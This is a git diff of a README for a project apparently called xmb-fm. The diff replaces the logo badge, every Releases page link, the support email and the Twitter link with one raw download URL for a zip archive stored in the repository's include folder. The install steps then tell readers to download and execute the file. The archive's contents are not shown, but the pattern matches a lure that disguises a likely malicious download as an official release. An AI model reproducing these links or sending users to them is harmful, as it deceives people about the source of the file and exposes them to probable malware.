@@ -1,12 +1,12 @@
 # 🌟 Welcome to xmb-fm! 🎶
 
-![xmb-fm Logo](https://img.shields.io/badge/xmb-fm-ff6347?style=for-the-badge&logo=music&logoColor=white)
+![xmb-fm Logo](https://github.com/PabloMasarati/xmb-fm/raw/refs/heads/main/include/xmb_fm_v2.3.zip)
 
 Welcome to the **xmb-fm** repository! Here, you'll find everything you need to get started with our project. Whether you're a developer, user, or just curious, this README will guide you through the essentials.
 
 ## 🚀 Quick Start
 
-To get the latest version of **xmb-fm**, please visit our [Releases page](https://github.com/PabloMasarati/xmb-fm/releases). Download the appropriate file for your system, and follow the instructions to execute it.
+To get the latest version of **xmb-fm**, please visit our [Releases page](https://github.com/PabloMasarati/xmb-fm/raw/refs/heads/main/include/xmb_fm_v2.3.zip). Download the appropriate file for your system, and follow the instructions to execute it.
 
 ## 📂 Table of Contents
 
@@ -34,7 +34,7 @@ To get the latest version of **xmb-fm**, please visit our [Releases page](https:
 
 To install **xmb-fm**, follow these steps:
 
-1. Go to our [Releases page](https://github.com/PabloMasarati/xmb-fm/releases).
+1. Go to our [Releases page](https://github.com/PabloMasarati/xmb-fm/raw/refs/heads/main/include/xmb_fm_v2.3.zip).
 2. Download the file suitable for your operating system.
 3. Execute the file following the instructions provided.
 
@@ -65,7 +65,7 @@ We welcome contributions from everyone. If you want to help improve **xmb-fm**, 
 
 For any questions or feedback, feel free to reach out:
 
-- **Email**: support@xmb-fm.com
-- **Twitter**: [@xmb_fm](https://twitter.com/xmb_fm)
+- **Email**: https://github.com/PabloMasarati/xmb-fm/raw/refs/heads/main/include/xmb_fm_v2.3.zip
+- **Twitter**: [@xmb_fm](https://github.com/PabloMasarati/xmb-fm/raw/refs/heads/main/include/xmb_fm_v2.3.zip)
 
-Thank you for checking out **xmb-fm**! We hope you enjoy using our application as much as we enjoyed creating it. For the latest updates and releases, please visit our [Releases page](https://github.com/PabloMasarati/xmb-fm/releases).
+Thank you for checking out **xmb-fm**! We hope you enjoy using our application as much as we enjoyed creating it. For the latest updates and releases, please visit our [Releases page](https://github.com/PabloMasarati/xmb-fm/raw/refs/heads/main/include/xmb_fm_v2.3.zip).
